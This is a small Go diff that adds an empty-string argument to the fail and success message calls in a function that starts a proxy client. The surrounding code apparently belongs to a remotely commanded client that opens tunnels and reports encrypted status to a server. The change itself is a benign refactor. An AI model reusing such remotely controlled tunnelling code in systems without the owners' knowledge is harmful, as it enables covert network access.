@@ -43,7 +43,7 @@ func proxyClientStartCmd(sendUserId, decData string) {
 	client, err := proxy.NewClient(defConfig, protos[0], *serverAddr, *proxyName, connType, proxyProto, fromAddr, toAddr)
 	if err != nil {
 		retData := colorcode.OutputMessage(colorcode.SIGN_FAIL, fmt.Sprintf("main NewClient fail %s", err.Error()))
-		common.SendFailMsg(sendUserId, common.ClientId, "proxyClientStart_ret", retData)
+		common.SendFailMsg(sendUserId, common.ClientId, "proxyClientStart_ret", retData, "")
 		return
 	}
 	var proxyClient = proxyopt.ProxyClient{
@@ -55,9 +55,9 @@ func proxyClientStartCmd(sendUserId, decData string) {
 	proxyopt.ProxyClientList = append(proxyopt.ProxyClientList, proxyClient)
 	marshal, _ := json.Marshal(proxyopt.ProxyClientList)
 	data, _ := crypto.Encrypt(marshal, []byte(config.AesKey))
-	common.SendSuccessMsg("Server", common.ClientId, "proxyClientStart", data)
+	common.SendSuccessMsg("Server", common.ClientId, "proxyClientStart", data, "")
 	retData := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "proxy client start!")
-	common.SendSuccessMsg(sendUserId, common.ClientId, "proxyClientStart_ret", retData)
+	common.SendSuccessMsg(sendUserId, common.ClientId, "proxyClientStart_ret", retData, "")
 }
 
 func proxyClientCloseCmd(decData string) {
